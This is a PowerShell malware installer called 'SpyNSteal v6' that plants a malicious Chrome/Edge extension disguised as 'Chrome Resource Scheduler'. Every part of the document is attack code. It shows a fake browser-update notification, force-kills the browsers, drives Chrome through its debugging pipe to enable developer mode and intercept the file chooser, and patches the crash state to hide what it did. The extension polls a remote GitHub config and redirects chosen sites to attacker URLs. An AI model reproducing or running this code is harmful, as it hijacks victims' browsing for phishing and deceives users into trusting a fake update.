# SpyNSteal v6 - Manual-path install via file chooser interception
# Uses chrome.developerPrivate.loadUnpacked() (the UI code path) instead of
# Extensions.loadUnpacked (the CDP debug path). Extensions installed via the
# UI path persist without --enable-unsafe-extension-debugging on every launch.

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://raw.githubusercontent.com/Intel-Boss/t/main/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try { Add-Content $LOGFILE "[$ts] $msg" } catch {}
}

Log "=========================================="
Log "SpyNSteal v6 - Starting"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "=========================================="

Add-Type -ReferencedAssemblies @("System.Core") -TypeDefinition @"
using System;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Collections.Generic;

public class PipeCDP {
    private static void Send(AnonymousPipeServerStream pipe, string json) {
        byte[] b = Encoding.UTF8.GetBytes(json);
        pipe.Write(b, 0, b.Length);
        pipe.WriteByte(0);
        pipe.Flush();
    }

    private static string ExtractStr(string json, string key) {
        string p = "\"" + key + "\":\"";
        int s = json.IndexOf(p);
        if (s < 0) return null;
        s += p.Length;
        int e = json.IndexOf("\"", s);
        return (e > s) ? json.Substring(s, e - s) : null;
    }

    private static string WaitReply(List<string> q, object lk, int id, int timeoutMs) {
        string t1 = "\"id\":" + id;
        string t2 = "\"id\": " + id;
        DateTime deadline = DateTime.Now.AddMilliseconds(timeoutMs);
        while (DateTime.Now < deadline) {
            lock (lk) {
                for (int i = 0; i < q.Count; i++) {
                    if (q[i].Contains(t1) || q[i].Contains(t2)) {
                        string r = q[i]; q.RemoveAt(i); return r;
                    }
                }
            }
            Thread.Sleep(100);
        }
        return null;
    }

    private static string WaitEvent(List<string> q, object lk, string eventName, int timeoutMs) {
        DateTime deadline = DateTime.Now.AddMilliseconds(timeoutMs);
        while (DateTime.Now < deadline) {
            lock (lk) {
                for (int i = 0; i < q.Count; i++) {
                    if (q[i].Contains("\"method\":\"" + eventName + "\"")) {
                        string r = q[i]; q.RemoveAt(i); return r;
                    }
                }
            }
            Thread.Sleep(100);
        }
        return null;
    }

    public static string Install(string chromePath, string userDataDir, string extensionDir) {
        AnonymousPipeServerStream toChrome = null;
        AnonymousPipeServerStream fromChrome = null;
        Process proc = null;
        string log = "";

        try {
            toChrome = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable);
            fromChrome = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);

            string rHandle = toChrome.GetClientHandleAsString();
            string wHandle = fromChrome.GetClientHandleAsString();

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = chromePath;
            psi.Arguments = String.Format(
                "--remote-debugging-pipe " +
                "--user-data-dir=\"{0}\" " +
                "--no-first-run --no-default-browser-check " +
                "--disable-background-networking " +
                "--remote-debugging-io-pipes={1},{2}",
                userDataDir, rHandle, wHandle);
            psi.UseShellExecute = false;
            log += "ARGS:" + psi.Arguments + "|";

            try { proc = Process.Start(psi); }
            catch (Exception ex) { return log + "ERR:LAUNCH:" + ex.Message; }

            toChrome.DisposeLocalCopyOfClientHandle();
            fromChrome.DisposeLocalCopyOfClientHandle();
            log += "PID:" + proc.Id + "|";

            Thread.Sleep(8000);
            if (proc.HasExited) return log + "ERR:DIED:" + proc.ExitCode;

            List<string> queue = new List<string>();
            object qLock = new object();

            Thread reader = new Thread(delegate() {
                try {
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        int bt = fromChrome.ReadByte();
                        if (bt == -1) break;
                        if (bt == 0) {
                            string m = sb.ToString(); sb.Length = 0;
                            if (m.Length > 0) { lock (qLock) { queue.Add(m); } }
                        } else { sb.Append((char)bt); }
                    }
                } catch {}
            });
            reader.IsBackground = true;
            reader.Start();

            // Verify pipe
            Send(toChrome, "{\"id\":0,\"method\":\"Browser.getVersion\"}");
            string verResp = WaitReply(queue, qLock, 0, 10000);
            if (verResp == null) { log += "PIPE_DEAD|"; try { proc.Kill(); } catch {} return log; }
            log += "PIPE:ok|";

            // Navigate to chrome://extensions
            Send(toChrome,
                "{\"id\":1,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"chrome://extensions\"}}");
            string tResp = WaitReply(queue, qLock, 1, 15000);
            string targetId = (tResp != null) ? ExtractStr(tResp, "targetId") : null;
            if (targetId == null) { log += "NO_TARGET|"; goto cleanup; }

            // Attach to extensions page
            Send(toChrome,
                "{\"id\":2,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"" + targetId + "\",\"flatten\":true}}");
            string aResp = WaitReply(queue, qLock, 2, 10000);
            string sessId = (aResp != null) ? ExtractStr(aResp, "sessionId") : null;
            if (sessId == null) { log += "NO_SESSION|"; goto cleanup; }
            log += "SESSION:ok|";

            // Wait for page to fully load
            Thread.Sleep(5000);

            // Enable developer mode
            Send(toChrome,
                "{\"id\":10,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                "\"expression\":\"chrome.developerPrivate.setProfileConfiguration({inDeveloperMode:true})\"," +
                "\"userGesture\":true,\"awaitPromise\":true}}");
            string devResp = WaitReply(queue, qLock, 10, 10000);
            log += "DEV:" + (devResp != null ? "ok" : "t/o") + "|";

            Thread.Sleep(3000);

            // Enable file chooser interception on this session
            Send(toChrome,
                "{\"id\":11,\"sessionId\":\"" + sessId + "\",\"method\":\"Page.setInterceptFileChooserDialog\",\"params\":{\"enabled\":true}}");
            string fcResp = WaitReply(queue, qLock, 11, 5000);
            log += "FC_INTERCEPT:" + (fcResp != null ? "ok" : "t/o") + "|";

            // Trigger loadUnpacked (opens file chooser which we intercept)
            string loadExpr = "chrome.developerPrivate.loadUnpacked().then(r=>JSON.stringify(r)).catch(e=>'ERR:'+e.message)";
            Send(toChrome,
                "{\"id\":12,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                "\"expression\":\"" + loadExpr.Replace("\"", "\\\"") + "\"," +
                "\"userGesture\":true,\"awaitPromise\":true}}");

            // Wait for file chooser event
            Thread.Sleep(1000);
            string fcEvent = WaitEvent(queue, qLock, "Page.fileChooserOpened", 10000);
            log += "FC_EVENT:" + (fcEvent != null ? "ok" : "NONE") + "|";

            if (fcEvent != null) {
                // Accept the file chooser with our extension directory
                string dirPath = extensionDir.Replace("\\", "\\\\");
                Send(toChrome,
                    "{\"id\":13,\"sessionId\":\"" + sessId + "\",\"method\":\"Page.handleFileChooser\",\"params\":{" +
                    "\"action\":\"accept\",\"files\":[\"" + dirPath + "\"]}}");
                string handleResp = WaitReply(queue, qLock, 13, 10000);
                log += "FC_HANDLE:" + (handleResp != null ? "ok" : "t/o") + "|";
            } else {
                log += "FC_FALLBACK|";
                // Fallback: try direct loadUnpacked with useDraggedPath approach
                // First simulate a drag event to set the path
                string dragData = "{\"items\":[],\"files\":[\"" + extensionDir.Replace("\\", "\\\\") + "\"],\"dragOperationsMask\":1}";
                Send(toChrome,
                    "{\"id\":14,\"sessionId\":\"" + sessId + "\",\"method\":\"Input.setInterceptDrags\",\"params\":{\"enabled\":true}}");
                WaitReply(queue, qLock, 14, 5000);

                Send(toChrome,
                    "{\"id\":15,\"sessionId\":\"" + sessId + "\",\"method\":\"Input.dispatchDragEvent\",\"params\":{" +
                    "\"type\":\"dragEnter\",\"x\":400,\"y\":300,\"data\":" + dragData + "}}");
                WaitReply(queue, qLock, 15, 5000);

                Send(toChrome,
                    "{\"id\":16,\"sessionId\":\"" + sessId + "\",\"method\":\"Input.dispatchDragEvent\",\"params\":{" +
                    "\"type\":\"drop\",\"x\":400,\"y\":300,\"data\":" + dragData + "}}");
                WaitReply(queue, qLock, 16, 5000);

                Thread.Sleep(3000);
            }

            // Wait for installation to complete
            Thread.Sleep(10000);

            // Check the extension loaded via Runtime.evaluate
            string checkExpr = "new Promise(r=>{chrome.management.getAll(exts=>{" +
                "let e=exts.find(x=>x.name==='Chrome Resource Scheduler');" +
                "r(e?JSON.stringify({id:e.id,enabled:e.enabled,type:e.installType}):'NOT_FOUND')" +
                "})})";
            Send(toChrome,
                "{\"id\":20,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                "\"expression\":\"" + checkExpr.Replace("\"", "\\\"") + "\",\"awaitPromise\":true,\"returnByValue\":true}}");
            string stateResp = WaitReply(queue, qLock, 20, 10000);
            log += "STATE:" + (stateResp != null ? stateResp.Substring(0, Math.Min(300, stateResp.Length)) : "t/o") + "|";

            // Also get loadUnpacked result (from id:12)
            string loadResult = WaitReply(queue, qLock, 12, 5000);
            log += "LOAD:" + (loadResult != null ? loadResult.Substring(0, Math.Min(200, loadResult.Length)) : "pending") + "|";

            // Wait for prefs to flush
            Thread.Sleep(5000);

            cleanup:
            try { Send(toChrome, "{\"id\":99,\"method\":\"Browser.close\"}"); } catch {}
            bool exited = false;
            try { exited = proc.WaitForExit(15000); } catch {}
            if (!exited) { try { proc.Kill(); } catch {} try { proc.WaitForExit(5000); } catch {} }
            log += "EXIT:" + exited + "|";
            proc = null;
            return log;

        } catch (Exception ex) {
            return log + "ERR:" + ex.Message;
        } finally {
            if (proc != null) { try { if (!proc.HasExited) proc.Kill(); } catch {} }
            if (toChrome != null) try { toChrome.Dispose(); } catch {}
            if (fromChrome != null) try { fromChrome.Dispose(); } catch {}
        }
    }
}
"@
Log "C# compiled OK"

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $exe = if ($name -eq "chrome") { "chrome.exe" } else { "msedge.exe" }
            $c = Join-Path $d $exe
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-Browser([string]$procName) {
    for ($i = 0; $i -lt 25; $i++) {
        if (-not (Get-Process $procName -EA SilentlyContinue)) { return $true }
        Get-Process $procName -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

# =============================================================================
Log "STEP 1: Dropping extension files..."
$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
$utf8 = New-Object Text.UTF8Encoding($false)
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, $utf8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, $utf8)
Log "  Extension at: $extDir"

Log "STEP 2: Finding browsers..."
$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "  ${name}: Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "FATAL: No browsers"; exit }

Log "STEP 3: Kill browsers..."
$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }
foreach ($b in $browsers) {
    if ($b.Running) {
        $k = Kill-Browser $b.Proc
        Log "  $($b.Proc) killed: $k"
    }
}
Start-Sleep 3

$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
Log "STEP 4: Target = $($target.Name) v$((Get-Item $target.ExePath).VersionInfo.FileVersion)"

# -- Create junction --
$realUserData = $target.UserData
$junctionPath = Join-Path (Split-Path $realUserData -Parent) "User Data_dbg"
Log "STEP 5: Creating junction..."
if (Test-Path $junctionPath) {
    $ji = Get-Item $junctionPath -Force
    if ($ji.Attributes -band [IO.FileAttributes]::ReparsePoint) { cmd /c rmdir "$junctionPath" 2>$null }
    else { Remove-Item $junctionPath -Recurse -Force -EA SilentlyContinue }
}
cmd /c mklink /J "$junctionPath" "$realUserData" 2>&1 | Out-Null
if (-not (Test-Path $junctionPath)) { Log "FATAL: Junction failed"; exit }
Log "  Junction OK"

# -- Install via manual path (file chooser interception) --
Log "STEP 6: CDP manual-path install (takes ~60 seconds)..."
$cdpResult = [PipeCDP]::Install($target.ExePath, $junctionPath, $extDir)
Log "STEP 6: Result = $cdpResult"

# -- Remove junction --
Start-Sleep 2
cmd /c rmdir "$junctionPath" 2>$null
Log "STEP 7: Junction removed"

# -- Verify --
$secPrefs = Join-Path $realUserData "Default\Secure Preferences"
if (Test-Path $secPrefs) {
    $sp = [IO.File]::ReadAllText($secPrefs)
    $hasExt = $sp.Contains("Chrome Resource Scheduler")
    Log "  Extension in Secure Prefs: $hasExt"
}

# -- Patch Local State --
$localState = Join-Path $realUserData "Local State"
if (Test-Path $localState) {
    try {
        $ls = [IO.File]::ReadAllText($localState)
        $ls = $ls.Replace('"exited_cleanly":false', '"exited_cleanly":true')
        $ls = $ls.Replace('"exit_type":"Crashed"', '"exit_type":"Normal"')
        [IO.File]::WriteAllText($localState, $ls, $utf8)
        Log "  Local State patched"
    } catch {}
}

# -- Relaunch normally --
Log "STEP 8: Relaunching $($target.Name) normally..."
Start-Process $target.ExePath
Start-Sleep 5
Log "  Running: $([bool](Get-Process $target.Proc -EA SilentlyContinue))"

Log "=========================================="
Log "DONE"
Log "=========================================="
